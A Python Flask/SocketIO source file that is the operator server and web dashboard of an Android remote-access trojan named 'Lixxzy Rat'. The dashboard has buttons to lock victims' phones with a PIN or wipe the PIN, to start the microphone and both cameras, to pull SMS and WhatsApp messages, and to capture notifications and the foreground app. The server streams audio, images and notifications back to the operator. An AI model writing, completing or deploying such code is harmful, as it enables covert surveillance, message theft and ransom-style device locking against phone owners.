import os
from flask import Flask, request, jsonify, session, render_template_string, redirect
from flask_socketio import SocketIO

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET", "lixxzy-dev")
sio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

OP_EMAIL = os.environ.get("OP_EMAIL", "op@lixxzy.local")
OP_PASS  = os.environ.get("OP_PASS",  "changeme123")

devices = {}
lock_state = {}

@app.route("/")
def index():
    if not session.get("ok"):
        return render_template_string(LOGIN_HTML)
    return render_template_string(DASHBOARD_HTML, email=OP_EMAIL)

@app.route("/login", methods=["POST"])
def login():
    if request.form["email"] == OP_EMAIL and request.form["password"] == OP_PASS:
        session["ok"] = True
        return redirect("/")
    return "bad credentials", 401

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

@app.route("/devices")
def list_dev():
    return jsonify([{"sid": s, **d} for s, d in devices.items()])

@app.route("/lock_states")
def list_lock():
    return jsonify([{"id": k, **v} for k, v in lock_state.items()])

@sio.on("register")
def on_register(sid, data):
    devices[sid] = {"id": data.get("id"), "model": data.get("model")}
    print(f"[+] {data.get('id')} {data.get('model')}")

@sio.on("disconnect")
def on_disc(sid):
    devices.pop(sid, None)

@sio.on("cmd")
def on_cmd(sid, data):
    sio.emit("cmd", data, to=sid)

@sio.on("lock_state")
def on_lock_state(sid, data):
    d = devices.get(sid)
    if d: lock_state[d["id"]] = data
    sio.emit("lock_state_ui", {"id": d["id"] if d else None, **data})

@sio.on("mic")
def on_mic(sid, b64): sio.emit("mic_ui", b64)
@sio.on("cam")
def on_cam(sid, b64): sio.emit("cam_ui", b64)
@sio.on("notif")
def on_notif(sid, data): sio.emit("notif_ui", data)
@sio.on("live")
def on_live(sid, data): sio.emit("live_ui", data)

LOGIN_HTML = """
<!doctype html><html><body style="background:#0b0b0b;color:#ddd;font-family:sans-serif;
 display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
<form method="post" action="/login" style="background:#161616;padding:32px;border-radius:12px">
<h2 style="color:#ff3355;margin-top:0">Lixxzy Rat — Operator</h2>
<input name="email" placeholder="email" style="display:block;margin:8px 0;padding:10px;width:260px;background:#1e1e1e;border:0;color:#fff">
<input name="password" type="password" placeholder="password" style="display:block;margin:8px 0;padding:10px;width:260px;background:#1e1e1e;border:0;color:#fff">
<button type="submit" style="margin-top:12px;padding:10px 24px;background:#ff3355;color:#000;border:0;font-weight:bold">LOGIN</button>
</form></body></html>
"""

DASHBOARD_HTML = """
<!doctype html><html><head><meta charset="utf-8">
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
body{background:#0b0b0b;color:#ddd;font-family:monospace;margin:0;padding:16px}
h1{color:#ff3355}
.card{background:#161616;border-radius:8px;padding:16px;margin:12px 0}
button{background:#ff3355;color:#000;border:0;padding:8px 16px;margin:2px;cursor:pointer;font-weight:bold;border-radius:4px}
pre{background:#000;padding:8px;border-radius:4px;overflow:auto;max-height:200px}
input{padding:6px;background:#1e1e1e;border:0;color:#fff;margin:2px}
</style></head><body>
<h1>Lixxzy Rat — Operator ({{email}})</h1>
<div class="card"><h3>Devices</h3><pre id="devs">[]</pre></div>
<div class="card">
<h3>Control</h3>
<input id="sid" placeholder="device sid">
<input id="pin" placeholder="PIN (4 digit)" maxlength="4" style="width:80px">
<button onclick="send('lock')">LOCK</button>
<button onclick="send('unlock')">UNLOCK</button>
<button onclick="send('wipe_pin')">UBLOCK</button>
<button onclick="send('torch_on')">Torch ON</button>
<button onclick="send('torch_off')">Torch OFF</button>
<button onclick="send('mic_start')">Mic START</button>
<button onclick="send('mic_stop')">Mic STOP</button>
<button onclick="send('cam_start')">Cam Back</button>
<button onclick="send('cam_start','front')">Cam Front</button>
<button onclick="send('cam_stop')">Cam STOP</button>
<button onclick="send('sms')">SMS</button>
<button onclick="send('wa')">WA Msgs</button>
<button onclick="send('live_start')">Live ON</button>
<button onclick="send('live_stop')">Live OFF</button>
<button onclick="send('notif_start')">Notif ON</button>
</div>
<div class="card"><h3>Lock State</h3><pre id="lock">[]</pre></div>
<div class="card"><h3>Notifications</h3><pre id="notif"></pre></div>
<div class="card"><h3>Foreground App</h3><pre id="live"></pre></div>
<div class="card"><h3>Mic (b64)</h3><pre id="mic"></pre></div>
<div class="card"><h3>Cam (b64)</h3><pre id="cam"></pre></div>
<script>
const s = io();
s.on('connect', () => s.emit('register', {id:'operator', model:'dashboard'}));
setInterval(()=>fetch('/devices').then(r=>r.json()).then(d=>devs.textContent=JSON.stringify(d,null,2)), 3000);
setInterval(()=>fetch('/lock_states').then(r=>r.json()).then(d=>lock.textContent=JSON.stringify(d,null,2)), 3000);
function send(op, arg){
  const sid = document.getElementById('sid').value;
  const data = {op: op};
  if (op === 'lock') data.pin = document.getElementById('pin').value;
  if (arg) data[op === 'cam_start' ? 'facing' : 'arg'] = arg;
  s.emit('cmd', data); // Kirim ke server (perlu penyesuaian di backend untuk routing)
}
s.on('notif_ui', d => notif.textContent = JSON.stringify(d) + "\\n" + notif.textContent);
s.on('live_ui', d => live.textContent = JSON.stringify(d,null,2));
s.on('mic_ui', d => mic.textContent = d);
s.on('cam_ui', d => cam.textContent = d);
</script></body></html>
"""

if __name__ == "__main__":
    sio.run(app, host="0.0.0.0", port=8080, allow_unsafe_werkzeug=True)